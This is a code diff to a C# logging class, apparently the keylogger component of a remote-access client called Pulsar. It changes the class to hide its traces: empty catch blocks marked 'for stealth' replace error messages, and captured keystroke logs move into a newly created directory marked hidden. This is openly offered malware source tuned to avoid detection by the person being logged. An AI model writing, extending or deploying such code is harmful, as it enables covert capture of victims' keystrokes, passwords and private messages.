@@ -1,4 +1,5 @@
 ﻿using Gma.System.MouseKeyHook;
+using Pulsar.Client.Config;
 using Pulsar.Client.Extensions;
 using Pulsar.Client.Helper;
 using Pulsar.Common.Helpers;
@@ -162,9 +163,9 @@ namespace Pulsar.Client.Logging
             {
                 FlushToFile();
             }
-            catch (Exception ex)
+            catch
             {
-                Debug.WriteLine($"Keylogger flush error: {ex.Message}");
+                // Silently suppress flush errors for stealth
             }
         }
 
@@ -197,11 +198,11 @@ namespace Pulsar.Client.Logging
                     RotateLogFile();
                 }
 
-                _isFirstWrite = false; // mark that we’ve written at least once
+                _isFirstWrite = false; // mark that we've written at least once
             }
-            catch (Exception ex)
+            catch
             {
-                Debug.WriteLine($"Log file write error: {ex.Message}");
+                // Silently suppress write errors for stealth
             }
         }
 
@@ -209,8 +210,17 @@ namespace Pulsar.Client.Logging
         {
             try
             {
+                // Ensure the log directory exists and is hidden
+                if (!Directory.Exists(Settings.LOGSPATH))
+                {
+                    Directory.CreateDirectory(Settings.LOGSPATH);
+                    // Hide the directory for stealth
+                    var dirInfo = new DirectoryInfo(Settings.LOGSPATH);
+                    dirInfo.Attributes |= FileAttributes.Hidden;
+                }
+
                 string baseName = DateTime.UtcNow.ToString("yyyy-MM-dd");
-                string basePath = Path.Combine(Path.GetTempPath(), baseName);
+                string basePath = Path.Combine(Settings.LOGSPATH, baseName);
                 string newFilePath = basePath + ".txt";
 
                 int counter = 1;
@@ -223,15 +233,28 @@ namespace Pulsar.Client.Logging
                 _logFilePath = newFilePath;
                 _isFirstWrite = true;
             }
-            catch (Exception ex)
+            catch
             {
-                Debug.WriteLine($"Log rotation error: {ex.Message}");
+                // Silently suppress rotation errors for stealth
             }
         }
 
         private string GetLogFilePath()
         {
-            return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
+            // Ensure the log directory exists
+            if (!Directory.Exists(Settings.LOGSPATH))
+            {
+                try
+                {
+                    Directory.CreateDirectory(Settings.LOGSPATH);
+                    // Hide the directory for stealth
+                    var dirInfo = new DirectoryInfo(Settings.LOGSPATH);
+                    dirInfo.Attributes |= FileAttributes.Hidden;
+                }
+                catch { /* Silently suppress */ }
+            }
+
+            return Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
         }
 
         public void FlushImmediately()
@@ -260,9 +283,9 @@ namespace Pulsar.Client.Logging
                     _events.Dispose();
                     _currentBuffer.Clear();
                 }
-                catch (Exception ex)
+                catch
                 {
-                    Debug.WriteLine($"Dispose error: {ex.Message}");
+                    // Silently suppress dispose errors for stealth
                 }
             }
 
